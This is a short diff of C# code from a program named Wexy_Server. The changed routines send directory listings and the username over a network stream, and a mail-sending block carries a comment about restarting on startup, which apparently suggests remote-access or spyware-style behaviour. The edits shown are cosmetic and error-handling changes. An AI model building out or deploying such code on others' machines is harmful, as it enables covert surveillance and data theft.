@@ -247,7 +247,7 @@ namespace Wexy_Server
             {
                 foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
                 {
-                    files = files + "\n" + f.Name + " - " + f.Length.ToString() + " bytes";
+                    files = files + "\n" + f.Name + " | " + f.Length.ToString() + " bytes";
                 }
                 byte[] Packet = Encoding.ASCII.GetBytes(files);
                 Writer.Write(Packet, 0, Packet.Length);
@@ -292,14 +292,8 @@ namespace Wexy_Server
             try
             {
                 string pcname = Environment.UserName;
-
-                //Creates a packet to hold the command, and gets the bytes from the string variable
                 byte[] Packet = Encoding.ASCII.GetBytes(pcname);
-
-                //Send the command over the network
                 Writer.Write(Packet, 0, Packet.Length);
-
-                //Flush out any extra data that didnt send in the start.
                 Writer.Flush();
             }
             catch
@@ -336,7 +330,11 @@ namespace Wexy_Server
             }
             catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
             {
-                Environment.Exit(0);
+                //Environment.Exit(0);
+                string response = "An error has occured while trying to send the mail";
+                byte[] Packet = Encoding.ASCII.GetBytes(response);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
             }
         }
 
